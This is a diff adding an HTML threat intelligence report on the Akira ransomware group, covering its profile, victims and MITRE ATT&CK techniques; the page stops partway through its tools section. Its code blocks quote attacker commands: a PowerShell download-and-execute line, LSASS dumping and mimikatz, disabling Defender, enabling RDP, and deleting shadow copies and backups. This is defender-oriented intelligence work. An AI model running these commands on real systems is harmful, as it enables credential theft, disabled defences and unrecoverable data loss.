@@ -1,0 +1,1647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AKIRA Ransomware - CTI Report</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #e0e0e0;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(26, 26, 46, 0.95);
+            border-radius: 10px;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.2);
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #c41e3a 0%, #8b0000 100%);
+            padding: 30px;
+            border-radius: 10px 10px 0 0;
+            border-bottom: 3px solid #ff0000;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            color: #ffffff;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            margin-bottom: 10px;
+        }
+        
+        .header .subtitle {
+            font-size: 1.2em;
+            color: #ffcccc;
+            margin-top: 10px;
+        }
+        
+        .threat-level {
+            background: #ff0000;
+            color: #ffffff;
+            padding: 15px 25px;
+            font-size: 1.3em;
+            font-weight: bold;
+            display: inline-block;
+            border-radius: 5px;
+            margin-top: 15px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+        
+        .content {
+            padding: 40px;
+        }
+        
+        .section {
+            margin-bottom: 40px;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 30px;
+            border-radius: 8px;
+            border-left: 4px solid #c41e3a;
+        }
+        
+        .section h2 {
+            color: #ff4444;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #c41e3a;
+        }
+        
+        .section h3 {
+            color: #ff6666;
+            font-size: 1.4em;
+            margin: 25px 0 15px 0;
+        }
+        
+        .section h4 {
+            color: #ff8888;
+            font-size: 1.2em;
+            margin: 20px 0 10px 0;
+        }
+        
+        .info-box {
+            background: rgba(196, 30, 58, 0.1);
+            border: 1px solid #c41e3a;
+            border-radius: 5px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 4px;
+        }
+        
+        .info-label {
+            font-weight: bold;
+            color: #ff6666;
+        }
+        
+        .info-value {
+            color: #e0e0e0;
+        }
+        
+        .warning-box {
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid #ff0000;
+            border-radius: 5px;
+            padding: 20px;
+            margin: 25px 0;
+        }
+        
+        .warning-box h3 {
+            color: #ff0000;
+            margin-bottom: 15px;
+        }
+        
+        ul, ol {
+            margin-left: 30px;
+            margin-top: 10px;
+        }
+        
+        li {
+            margin: 8px 0;
+        }
+        
+        .table-container {
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: rgba(255, 255, 255, 0.02);
+        }
+        
+        th {
+            background: #c41e3a;
+            color: #ffffff;
+            padding: 12px;
+            text-align: left;
+            font-weight: bold;
+        }
+        
+        td {
+            padding: 12px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        tr:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+        
+        .mitre-technique {
+            background: rgba(255, 100, 100, 0.1);
+            border-left: 3px solid #ff6464;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+        
+        .technique-id {
+            color: #ff4444;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .code-block {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+            overflow-x: auto;
+        }
+        
+        .footer {
+            background: rgba(26, 26, 46, 0.95);
+            padding: 20px 40px;
+            border-top: 2px solid #c41e3a;
+            text-align: center;
+            color: #888;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+        
+        .stat-card {
+            background: rgba(196, 30, 58, 0.1);
+            border: 1px solid #c41e3a;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 2.5em;
+            color: #ff4444;
+            font-weight: bold;
+        }
+        
+        .stat-label {
+            color: #aaa;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⚠️ AKIRA RANSOMWARE</h1>
+            <div class="subtitle">Comprehensive Cyber Threat Intelligence Report</div>
+            <div class="subtitle">Ransomware-as-a-Service (RaaS) Operation</div>
+            <div class="threat-level">⚠ THREAT LEVEL: CRITICAL</div>
+        </div>
+        
+        <div class="content">
+            <!-- EXECUTIVE SUMMARY -->
+            <div class="section">
+                <h2>🎯 EXECUTIVE SUMMARY</h2>
+                
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-number">$244M+</div>
+                        <div class="stat-label">Ransom Proceeds (as of Sept 2025)</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">350+</div>
+                        <div class="stat-label">Confirmed Victims</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">2023</div>
+                        <div class="stat-label">First Observed (March)</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">Active</div>
+                        <div class="stat-label">Current Status</div>
+                    </div>
+                </div>
+
+                <p>AKIRA is a sophisticated Ransomware-as-a-Service (RaaS) operation that emerged in March 2023 and has rapidly established itself as one of the most dangerous and financially successful ransomware threats targeting organizations globally. The threat actor has demonstrated exceptional operational capabilities, sophisticated technical implementation, and continuous evolution of tactics, techniques, and procedures (TTPs).</p>
+
+                <div class="info-box">
+                    <div class="info-row">
+                        <span class="info-label">Threat Actor Name:</span>
+                        <span class="info-value">AKIRA / Akira Ransomware Group</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Associated Groups:</span>
+                        <span class="info-value">Storm-1567, Howling Scorpius, PUNK SPIDER, GOLD SAHARA</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Suspected Origin:</span>
+                        <span class="info-value">Russia (linked to defunct Conti ransomware syndicate)</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Operation Model:</span>
+                        <span class="info-value">Ransomware-as-a-Service (RaaS)</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Primary Motivation:</span>
+                        <span class="info-value">Financial Gain</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- THREAT ACTOR PROFILE -->
+            <div class="section">
+                <h2>👤 THREAT ACTOR PROFILE</h2>
+                
+                <h3>Origin & Political Affiliation</h3>
+                <p>AKIRA is believed to have strong connections to the now-defunct Conti ransomware syndicate, which ceased operations in May 2022 following the Russian invasion of Ukraine and subsequent internal conflicts. Multiple indicators support this connection:</p>
+                
+                <ul>
+                    <li><strong>Code Overlap:</strong> Technical analysis reveals significant similarities between AKIRA and Conti ransomware, including identical file type exclusions, similar directory targeting, and comparable encryption implementation</li>
+                    <li><strong>Blockchain Analysis:</strong> Cryptocurrency transaction analysis has identified financial links between AKIRA wallet addresses and known Conti-affiliated wallets</li>
+                    <li><strong>Operational Similarities:</strong> AKIRA employs tactics and techniques consistent with known Conti operations</li>
+                    <li><strong>Geographic Indicators:</strong> While AKIRA targets organizations globally, patterns suggest Russian-speaking operators</li>
+                </ul>
+
+                <p><strong>Political Affiliation:</strong> No explicit political agenda has been identified. AKIRA appears to be purely financially motivated, avoiding attribution to any state-sponsored activities. The group operates as a criminal enterprise focused on maximum profit extraction through ransomware operations.</p>
+
+                <h3>Typical Victims & Target Selection</h3>
+                <p>AKIRA demonstrates an opportunistic yet strategic victim selection process:</p>
+
+                <h4>Geographic Targeting:</h4>
+                <ul>
+                    <li><strong>Primary:</strong> United States (largest victim demographic - approximately 80% of victims)</li>
+                    <li><strong>Secondary:</strong> Canada, United Kingdom, Germany, Australia, France</li>
+                    <li><strong>Emerging:</strong> Latin America (recent expansion observed)</li>
+                    <li><strong>Coverage:</strong> North America, Europe, Asia-Pacific regions</li>
+                </ul>
+
+                <h4>Industry Sectors Targeted:</h4>
+                <ul>
+                    <li>Manufacturing (most heavily targeted)</li>
+                    <li>Healthcare and Public Health</li>
+                    <li>Education (K-12 and Higher Education)</li>
+                    <li>Financial Services</li>
+                    <li>Professional Services</li>
+                    <li>Construction and Materials</li>
+                    <li>Information Technology</li>
+                    <li>Critical Infrastructure</li>
+                    <li>Government Organizations</li>
+                    <li>Retail and Consumer Services</li>
+                </ul>
+
+                <h4>Organization Size Profile:</h4>
+                <ul>
+                    <li><strong>Small Businesses:</strong> 1-200 employees (59% of victims)</li>
+                    <li><strong>Medium Enterprises:</strong> 200-1,000 employees (significant portion)</li>
+                    <li><strong>Large Organizations:</strong> 1,000+ employees (selective targeting)</li>
+                </ul>
+
+                <p>AKIRA is assessed to be an opportunistic threat actor that targets organizations of all sizes, with particular focus on small-to-medium businesses (SMBs) that often have limited cybersecurity resources but maintain valuable data assets.</p>
+
+                <h3>Typical Cybercrime Activities</h3>
+
+                <h4>🔐 Ransomware Operations (Primary Activity)</h4>
+                <p>AKIRA's core business model revolves around sophisticated ransomware deployment targeting Windows, Linux, and VMware ESXi environments. The group has developed multiple ransomware variants including the original C++-based version, the Rust-based "Megazord" variant, and "Akira_v2" ESXi encryptor.</p>
+
+                <h4>💾 Data Exfiltration & Double Extortion</h4>
+                <p>Prior to encryption, AKIRA systematically exfiltrates sensitive organizational data including:</p>
+                <ul>
+                    <li>Customer databases and personal information (PII)</li>
+                    <li>Financial records and banking information</li>
+                    <li>Intellectual property and trade secrets</li>
+                    <li>Internal communications and sensitive documents</li>
+                    <li>Contract agreements and legal documents</li>
+                    <li>Employee data and HR records</li>
+                </ul>
+                
+                <p>The stolen data is leveraged in a double-extortion model where victims face two separate threats:</p>
+                <ol>
+                    <li><strong>Operational Disruption:</strong> Encrypted systems preventing business operations</li>
+                    <li><strong>Data Publication:</strong> Public release of sensitive data on dark web leak site if ransom is not paid</li>
+                </ol>
+
+                <p>Uniquely, AKIRA offers victims flexibility in choosing what to pay for - either file decryption, data deletion, or both - with ransom demands ranging from $200,000 to over $4,000,000 based on victim organization size and perceived ability to pay.</p>
+
+                <h4>🎭 Ransomware-as-a-Service (RaaS) Operations</h4>
+                <p>AKIRA operates a centralized RaaS platform where:</p>
+                <ul>
+                    <li>Core group maintains ransomware development and infrastructure</li>
+                    <li>Affiliates conduct individual attacks using provided tools and infrastructure</li>
+                    <li>Revenue sharing arrangement between operators and affiliates</li>
+                    <li>Centralized negotiation portal and leak site on Tor network</li>
+                    <li>Coordinated brand management and public communications</li>
+                </ul>
+
+                <h4>🌐 Infrastructure Compromise & Persistence</h4>
+                <p>Beyond immediate ransomware deployment, AKIRA engages in:</p>
+                <ul>
+                    <li>Long-term network compromise for reconnaissance</li>
+                    <li>Credential harvesting and privilege escalation</li>
+                    <li>Lateral movement across enterprise networks</li>
+                    <li>Backup destruction to prevent recovery</li>
+                    <li>Security tool disablement and anti-forensic techniques</li>
+                </ul>
+
+                <h4>Notable Characteristics:</h4>
+                <ul>
+                    <li><strong>Speed of Attack:</strong> Capable of progressing from initial access to data exfiltration in as little as 2 hours</li>
+                    <li><strong>Retro Aesthetic:</strong> Tor-based leak site styled after 1980s "green screen" terminals, navigable via command-line interface</li>
+                    <li><strong>Victim Engagement:</strong> Provides "decryption proof" samples to build trust during negotiations</li>
+                    <li><strong>Active Management:</strong> Operators actively manage attack lifecycle, demonstrating sophistication and adaptability</li>
+                    <li><strong>Continuous Evolution:</strong> Regular updates to encryption methods, target platforms, and evasion techniques</li>
+                </ul>
+            </div>
+
+            <!-- TACTICS, TECHNIQUES & PROCEDURES (TTPs) -->
+            <div class="section">
+                <h2>🔍 TACTICS, TECHNIQUES & PROCEDURES (TTPs)</h2>
+                <p>AKIRA threat actor TTPs mapped to the MITRE ATT&CK Framework (v18):</p>
+
+                <h3>⚡ Initial Access (TA0001)</h3>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1190 - Exploit Public-Facing Application</div>
+                    <p><strong>Description:</strong> AKIRA threat actors exploit known vulnerabilities in public-facing applications and services to gain initial access to victim networks. Primary targets include VPN appliances, network security devices, and remote access solutions.</p>
+                    <p><strong>Implementation:</strong> Exploitation of Cisco ASA/FTD vulnerabilities (CVE-2020-3259, CVE-2023-20269, CVE-2020-3580, CVE-2024-37085), SonicWall SonicOS (CVE-2024-40766), Veeam Backup & Replication (CVE-2024-40711), and other enterprise appliances.</p>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1078 - Valid Accounts</div>
+                    <p><strong>Description:</strong> AKIRA frequently leverages compromised credentials to access victim environments, particularly targeting VPN and RDP services without multi-factor authentication.</p>
+                    <p><strong>Implementation:</strong> Use of stolen credentials obtained through Initial Access Brokers (IABs), credential stuffing, or prior compromises to authenticate to VPN services, RDP endpoints, and remote management tools.</p>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1566 - Phishing</div>
+                    <p><strong>Description:</strong> Spear-phishing campaigns containing malicious attachments or links targeting specific organizations.</p>
+                    <p><strong>Implementation:</strong> Delivery of malicious payloads or credential harvesting pages through targeted email campaigns.</p>
+                </div>
+
+                <h3>🔓 Execution (TA0002)</h3>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1059.001 - Command and Scripting Interpreter: PowerShell</div>
+                    <p><strong>Description:</strong> Extensive use of PowerShell for credential dumping, reconnaissance, lateral movement, and defense evasion.</p>
+                    <p><strong>Examples:</strong></p>
+                    <div class="code-block">
+# Credential Harvesting from Veeam Servers
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadString('...')"
+
+# Shadow Copy Deletion
+powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"
+
+# Disable Windows Defender
+Set-MpPreference -DisableRealtimeMonitoring $true
+                    </div>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1059.003 - Command and Scripting Interpreter: Windows Command Shell</div>
+                    <p><strong>Description:</strong> Use of cmd.exe and WMIC for system manipulation, service termination, and configuration changes.</p>
+                </div>
+
+                <h3>🔐 Persistence (TA0003)</h3>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1136.002 - Create Account: Domain Account</div>
+                    <p><strong>Description:</strong> Creation of new administrative domain accounts for persistent access to compromised environments.</p>
+                    <p><strong>Common Account Names:</strong> "itadm", "backup", "admin", custom names blending with legitimate accounts</p>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys</div>
+                    <p><strong>Description:</strong> Modification of registry keys to establish persistence mechanisms.</p>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1219 - Remote Access Software</div>
+                    <p><strong>Description:</strong> Installation of legitimate remote access tools for persistent backdoor access.</p>
+                    <p><strong>Tools Used:</strong> AnyDesk, Radmin, MobaXterm, RustDesk</p>
+                </div>
+
+                <h3>⬆️ Privilege Escalation (TA0004)</h3>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1003.001 - OS Credential Dumping: LSASS Memory</div>
+                    <p><strong>Description:</strong> Extraction of credentials from Local Security Authority Subsystem Service (LSASS) process memory.</p>
+                    <p><strong>Implementation:</strong></p>
+                    <div class="code-block">
+# LSASS Dump using Comsvcs.dll (stealthy method)
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [LSASS_PID] C:\temp\lsass.dmp full
+
+# Direct credential access
+mimikatz.exe "sekurlsa::logonpasswords"
+                    </div>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1003 - OS Credential Dumping</div>
+                    <p><strong>Description:</strong> Use of credential scraping tools including Mimikatz and LaZagne to extract stored credentials.</p>
+                    <p><strong>Techniques:</strong> NTDS.dit extraction from domain controllers, browser credential theft, Kerberos ticket extraction</p>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1558.003 - Kerberoasting</div>
+                    <p><strong>Description:</strong> Kerberoasting attacks to extract service account credentials for privilege escalation.</p>
+                </div>
+
+                <h3>🚫 Defense Evasion (TA0005)</h3>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1562.001 - Impair Defenses: Disable or Modify Tools</div>
+                    <p><strong>Description:</strong> Systematic disabling of security software, antivirus, and EDR solutions before ransomware deployment.</p>
+                    <p><strong>Implementation:</strong> Use of PowerTool to exploit Zemana AntiMalware driver, KillAV tool, Terminator, and direct service termination commands</p>
+                    <div class="code-block">
+# Disable Windows Defender
+powershell Set-MpPreference -DisableRealtimeMonitoring $true
+Add-MpPreference -ExclusionPath "C:\"
+
+# Terminate security processes using PowerTool
+PowerTool.exe /kill [AV_Process_PID]
+                    </div>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1070 - Indicator Removal on Host</div>
+                    <p><strong>Description:</strong> Deletion of logs, command history, and forensic artifacts to hinder investigation.</p>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1027 - Obfuscated Files or Information</div>
+                    <p><strong>Description:</strong> Use of binary padding, string obfuscation, and matching legitimate file naming conventions to evade detection.</p>
+                </div>
+
+                <h3>🔎 Discovery (TA0007)</h3>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1082 - System Information Discovery</div>
+                    <p><strong>Description:</strong> Collection of detailed system information using PCHunter64 and built-in Windows commands.</p>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1016 - System Network Configuration Discovery</div>
+                    <p><strong>Description:</strong> Network reconnaissance using Advanced IP Scanner, MASSCAN, SoftPerfect Network Scanner, and NetScan.</p>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1018 - Remote System Discovery</div>
+                    <p><strong>Description:</strong> Identification of domain controllers and network systems.</p>
+                    <div class="code-block">
+# Domain Controller Discovery
+nltest /dclist:
+net group "Domain Controllers" /domain
+
+# Domain Trust Enumeration
+nltest /DOMAIN_TRUSTS
+                    </div>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1087 - Account Discovery</div>
+                    <p><strong>Description:</strong> Use of AdFind, SharpHound, and native Windows commands to enumerate Active Directory and identify high-value accounts.</p>
+                    <div class="code-block">
+# Active Directory Enumeration
+AdFind.exe -f "(objectcategory=person)"
+net user /domain
+net group "Domain Admins" /domain
+                    </div>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1482 - Domain Trust Discovery</div>
+                    <p><strong>Description:</strong> Mapping of domain trust relationships for lateral movement planning.</p>
+                </div>
+
+                <h3>↔️ Lateral Movement (TA0008)</h3>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1021.001 - Remote Services: Remote Desktop Protocol</div>
+                    <p><strong>Description:</strong> Primary method for lateral movement using RDP with compromised credentials.</p>
+                    <p><strong>Implementation:</strong> RDP enabled on target systems, use of legitimate credentials for authentication, and remote control of systems throughout the network.</p>
+                    <div class="code-block">
+# Enable RDP on target systems
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+                    </div>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1021.002 - Remote Services: SMB/Windows Admin Shares</div>
+                    <p><strong>Description:</strong> Lateral file transfer and command execution via SMB shares.</p>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1570 - Lateral Tool Transfer</div>
+                    <p><strong>Description:</strong> Transfer of tools and ransomware payloads across the network via SMB, RDP, and administrative shares.</p>
+                </div>
+
+                <h3>📦 Collection (TA0009)</h3>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1560 - Archive Collected Data</div>
+                    <p><strong>Description:</strong> Compression of exfiltrated data using WinRAR, 7-Zip, and other archiving utilities.</p>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1005 - Data from Local System</div>
+                    <p><strong>Description:</strong> Collection of sensitive data from local drives, including documents, databases, and configuration files.</p>
+                </div>
+
+                <h3>📤 Exfiltration (TA0010)</h3>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1048 - Exfiltration Over Alternative Protocol</div>
+                    <p><strong>Description:</strong> Data exfiltration using various protocols and services.</p>
+                    <p><strong>Methods:</strong></p>
+                    <ul>
+                        <li>FTP/SFTP using FileZilla and WinSCP</li>
+                        <li>Cloud storage services (Mega, Amazon S3)</li>
+                        <li>WebDAV protocols</li>
+                        <li>Rclone for cloud service exfiltration</li>
+                    </ul>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1537 - Transfer Data to Cloud Account</div>
+                    <p><strong>Description:</strong> Use of cloud storage services like Mega for staging and exfiltrating stolen data.</p>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1572 - Protocol Tunneling</div>
+                    <p><strong>Description:</strong> Use of Ngrok and Cloudflare Tunnel to establish encrypted C2 communications that bypass perimeter monitoring.</p>
+                    <div class="code-block">
+# Cloudflare Tunnel Establishment
+C:\ProgramData\cloudflared.exe tunnel run --token [REDACTED]
+                    </div>
+                </div>
+
+                <h3>💥 Impact (TA0040)</h3>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1486 - Data Encrypted for Impact</div>
+                    <p><strong>Description:</strong> AKIRA ransomware encrypts files in victim environments using a sophisticated hybrid encryption scheme combining ChaCha20 stream cipher with RSA public-key cryptosystem for fast and secure encryption.</p>
+                    <p><strong>Implementation:</strong></p>
+                    <ul>
+                        <li>Uses hybrid encryption (ChaCha20 + RSA-4096) for optimal speed and security</li>
+                        <li>Customizes encryption methods based on file type and size</li>
+                        <li>Capable of full or partial file encryption</li>
+                        <li>Encrypted files appended with extensions: <code>.akira</code>, <code>.powerranges</code>, <code>.akiranew</code>, or <code>.aki</code></li>
+                        <li>Generates unique ransom notes named <code>akira_readme.txt</code> or <code>fn.txt</code></li>
+                        <li>Targets both Windows and Linux/VMware ESXi environments with platform-specific variants</li>
+                    </ul>
+                    <div class="code-block">
+# Example ransom note location
+C:\akira_readme.txt
+C:\Users\[username]\akira_readme.txt
+
+# Encrypted file examples
+important_document.docx.akira
+database_backup.sql.powerranges
+financial_report.xlsx.akiranew
+                    </div>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1490 - Inhibit System Recovery</div>
+                    <p><strong>Description:</strong> AKIRA threat actors systematically delete backup and recovery capabilities to prevent victims from restoring their systems without paying the ransom.</p>
+                    <p><strong>Implementation:</strong></p>
+                    <div class="code-block">
+# Delete Volume Shadow Copies using PowerShell
+powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"
+
+# Delete VSS using vssadmin
+vssadmin.exe Delete Shadows /All /Quiet
+
+# Disable Windows Recovery
+bcdedit /set {default} recoveryenabled No
+bcdedit /set {default} bootstatuspolicy ignoreallfailures
+
+# Delete Windows backup catalog
+wbadmin delete catalog -quiet
+                    </div>
+                    <p>The encryptor executable (<code>w.exe</code>) automatically executes these commands to ensure victims cannot recover files through built-in Windows recovery mechanisms.</p>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1489 - Service Stop</div>
+                    <p><strong>Description:</strong> Termination of critical services including backup software, databases, security products, and business-critical applications before encryption.</p>
+                    <p><strong>Targeted Services:</strong></p>
+                    <ul>
+                        <li>SQL Server, MySQL, Oracle Database services</li>
+                        <li>Microsoft Exchange Server</li>
+                        <li>Backup services (Veeam, Backup Exec, Shadow Protect)</li>
+                        <li>Virtual machine services (VMware Tools, Hyper-V)</li>
+                        <li>Email servers and collaboration tools</li>
+                    </ul>
+                    <div class="code-block">
+# Stop services using net stop
+net stop "SQL Server (MSSQLSERVER)"
+net stop "Veeam Backup Service"
+
+# Kill processes using taskkill
+taskkill /F /IM sqlservr.exe
+taskkill /F /IM mysqld.exe
+                    </div>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1657 - Financial Theft</div>
+                    <p><strong>Description:</strong> AKIRA operates a double-extortion ransomware model focused on financial gain through ransom payments and threat of data publication.</p>
+                    <p><strong>Extortion Methods:</strong></p>
+                    <ul>
+                        <li><strong>Primary Demand:</strong> Ransom for decryption keys (ranging from $200,000 to $4,000,000)</li>
+                        <li><strong>Secondary Threat:</strong> Public release of stolen data on Tor-based leak site if payment not made</li>
+                        <li><strong>Flexible Payment Options:</strong> Victims can negotiate to pay for decryption only, data deletion only, or both</li>
+                        <li><strong>Negotiation Process:</strong> Conducted through dedicated Tor portal with unique victim codes</li>
+                        <li><strong>Payment Method:</strong> Bitcoin to cryptocurrency wallet addresses provided during negotiation</li>
+                        <li><strong>Additional Pressure:</strong> Direct phone calls to victims in some cases</li>
+                        <li><strong>Proof of Capability:</strong> Provision of sample file decryption to build trust</li>
+                    </ul>
+                    <p><strong>Financial Impact:</strong> As of September 2025, AKIRA has extorted approximately <strong>$244.17 million USD</strong> from over 350 confirmed victims worldwide.</p>
+                </div>
+
+                <div class="mitre-technique">
+                    <div class="technique-id">T1531 - Account Access Removal</div>
+                    <p><strong>Description:</strong> AKIRA threat actors delete administrator accounts and modify permissions to lock out legitimate users and complicate recovery efforts.</p>
+                    <p><strong>Implementation:</strong> Deletion of domain administrator accounts, local admin accounts, and service accounts after establishing their own persistence mechanisms.</p>
+                </div>
+            </div>
+
+            <!-- TOOLS SECTION -->
+            <div class="section">
+                <h2>🛠️ TOOLS & UTILITIES</h2>
+                <p>AKIRA threat actors leverage a sophisticated toolkit combining legitimate administrative tools, open-source utilities, and custom malware to accomplish their objectives across all attack phases:</p>
+
+                <h3>Remote Access & Persistence Tools</h3>
+                
+                <div class="info-box">
+                    <h4>AnyDesk</h4>
+                    <p><strong>Category:</strong> Legitimate Remote Desktop Software</p>
+                    <p><strong>Malicious Use:</strong> AKIRA extensively uses AnyDesk to maintain persistent remote access to compromised systems. Once deployed, threat actors can control systems, transfer files, and execute commands without triggering alerts for unauthorized remote access tools.</p>
+                    <p><strong>Detection Indicators:</strong> Unexpected AnyDesk installations, connections to unusual external IPs, execution from non-standard directories</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>RustDesk</h4>
+                    <p><strong>Category:</strong> Open-Source Remote Desktop</p>
+                    <p><strong>Malicious Use:</strong> Alternative to AnyDesk for maintaining backdoor access. RustDesk's open-source nature allows threat actors to customize and deploy without licensing concerns.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>MobaXterm</h4>
+                    <p><strong>Category:</strong> Enhanced Terminal with SSH/RDP</p>
+                    <p><strong>Malicious Use:</strong> Used for lateral movement via SSH and RDP connections. MobaXterm provides integrated tools for file transfer and remote execution.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>LogMeIn</h4>
+                    <p><strong>Category:</strong> Commercial Remote Access</p>
+                    <p><strong>Malicious Use:</strong> Leveraged for persistent access and lateral movement within compromised networks.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Radmin</h4>
+                    <p><strong>Category:</strong> Remote Administration Tool</p>
+                    <p><strong>Malicious Use:</strong> Remote control and file transfer capabilities used for maintaining access and moving laterally.</p>
+                </div>
+
+                <h3>Credential Access Tools</h3>
+
+                <div class="info-box">
+                    <h4>Mimikatz</h4>
+                    <p><strong>Category:</strong> Credential Extraction Tool</p>
+                    <p><strong>Malicious Use:</strong> Industry-standard tool for dumping credentials from LSASS memory, extracting Kerberos tickets, and performing pass-the-hash attacks. AKIRA uses Mimikatz extensively for privilege escalation and lateral movement.</p>
+                    <p><strong>Capabilities Exploited:</strong></p>
+                    <ul>
+                        <li>LSASS memory credential dumping</li>
+                        <li>Kerberos ticket extraction (Golden/Silver tickets)</li>
+                        <li>Pass-the-hash and pass-the-ticket attacks</li>
+                        <li>Windows Credential Manager access</li>
+                        <li>DCSync attacks against domain controllers</li>
+                    </ul>
+                </div>
+
+                <div class="info-box">
+                    <h4>LaZagne</h4>
+                    <p><strong>Category:</strong> Password Recovery Tool</p>
+                    <p><strong>Malicious Use:</strong> Open-source credential harvesting tool that retrieves stored passwords from multiple sources including browsers, email clients, databases, WiFi networks, and system vaults.</p>
+                    <p><strong>Targeted Credential Stores:</strong></p>
+                    <ul>
+                        <li>Web browsers (Chrome, Firefox, Edge)</li>
+                        <li>Email clients (Outlook, Thunderbird)</li>
+                        <li>FTP clients (FileZilla, WinSCP)</li>
+                        <li>Windows Credential Manager</li>
+                        <li>Database credentials (MySQL, PostgreSQL)</li>
+                    </ul>
+                </div>
+
+                <div class="info-box">
+                    <h4>DonPAPI</h4>
+                    <p><strong>Category:</strong> DPAPI Credential Extraction</p>
+                    <p><strong>Malicious Use:</strong> Specialized tool for extracting credentials protected by Windows Data Protection API (DPAPI), including browser credentials and Windows Vault data.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>SharpDomainSpray</h4>
+                    <p><strong>Category:</strong> Password Spraying Tool</p>
+                    <p><strong>Malicious Use:</strong> Performs password spraying attacks against Active Directory accounts to identify weak credentials without triggering account lockouts.</p>
+                </div>
+
+                <h3>Discovery & Reconnaissance Tools</h3>
+
+                <div class="info-box">
+                    <h4>AdFind</h4>
+                    <p><strong>Category:</strong> Active Directory Query Tool</p>
